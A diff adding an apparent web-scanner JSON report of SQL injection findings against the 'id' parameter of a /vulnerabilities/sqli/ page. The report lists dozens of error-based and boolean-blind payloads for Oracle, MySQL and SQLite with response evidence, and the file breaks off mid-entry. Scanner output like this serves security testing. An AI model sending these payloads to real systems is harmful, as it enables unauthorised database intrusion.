@@ -1,0 +1,3812 @@
+{
+  "metadata": {
+    "scan_time": "2026-04-29 13:53:37",
+    "summary": {
+      "queued": 12024,
+      "completed": 12024,
+      "failures": 0,
+      "findings": 160
+    }
+  },
+  "vulnerabilities": [
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62))) FROM DUAL) AND 'vun%'='vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0242,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%' AND CASE WHEN 1=1 THEN 1 ELSE JSON(x'76756e') END AND 'vun%'='vun",
+        "type": "SQLi-boolean_blind",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0151,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%' AND GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) AND 'vun%'='vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.016,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) AND 'vun%'='vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0231,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%' AND UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) AND 'vun%'='vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0263,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%' OR 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62))) FROM DUAL) AND 'vun%'='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0237,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%' OR CASE WHEN 1=1 THEN 1 ELSE JSON(x'76756e') END AND 'vun%'='vun",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.031,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%' OR UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) AND 'vun%'='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.012,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%' OR GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) AND 'vun%'='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0287,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) AND 'vun%'='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0323,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62))) FROM DUAL) AND CHR(118)||CHR(117)||CHR(110)='vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.1447,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62))) FROM DUAL) AND CHR(118)||CHR(117)||CHR(110) LIKE 'vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.1458,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62))) FROM DUAL) OR 'vun1'='vun2",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0074,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND CASE WHEN 1=1 THEN 1 ELSE JSON(x'76756e') END AND x'76756e' LIKE 'vun",
+        "type": "SQLi-boolean_blind",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0155,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND CASE WHEN 1=1 THEN 1 ELSE JSON(x'76756e') END OR 'vun1'='vun2",
+        "type": "SQLi-boolean_blind",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0182,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND CASE WHEN 1=1 THEN 1 ELSE JSON(x'76756e') END AND x'76756e'='vun",
+        "type": "SQLi-boolean_blind",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0209,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) AND 0x76756e LIKE 'vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0142,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) AND 0x76756e='vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0156,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) OR 'vun1'='vun2",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0223,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) AND 0x76756e LIKE 'vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0251,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) AND 0x76756e='vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0272,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) OR 'vun1'='vun2",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0313,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) AND 0x76756e LIKE 'vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0166,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) AND 0x76756e='vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0173,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' AND UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) OR 'vun1'='vun2",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0197,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62))) FROM DUAL) AND CHR(118)||CHR(117)||CHR(110)='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0102,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62))) FROM DUAL) AND CHR(118)||CHR(117)||CHR(110) LIKE 'vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0142,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62))) FROM DUAL) OR 'vun1'='vun2",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0206,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR CASE WHEN 1=1 THEN 1 ELSE JSON(x'76756e') END OR 'vun1'='vun2",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.006,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR CASE WHEN 1=1 THEN 1 ELSE JSON(x'76756e') END AND x'76756e' LIKE 'vun",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0216,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR CASE WHEN 1=1 THEN 1 ELSE JSON(x'76756e') END AND x'76756e'='vun",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0224,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) AND 0x76756e LIKE 'vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0224,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) AND 0x76756e='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0224,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) OR 'vun1'='vun2",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0236,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) AND 0x76756e LIKE 'vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0226,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) AND 0x76756e='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0231,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) OR 'vun1'='vun2",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0107,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) AND 0x76756e LIKE 'vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0388,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) AND 0x76756e='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0326,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "' OR UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) OR 'vun1'='vun2",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0114,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62))) FROM DUAL) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.1552,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65))) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.1924,
+        "analysis_details": [
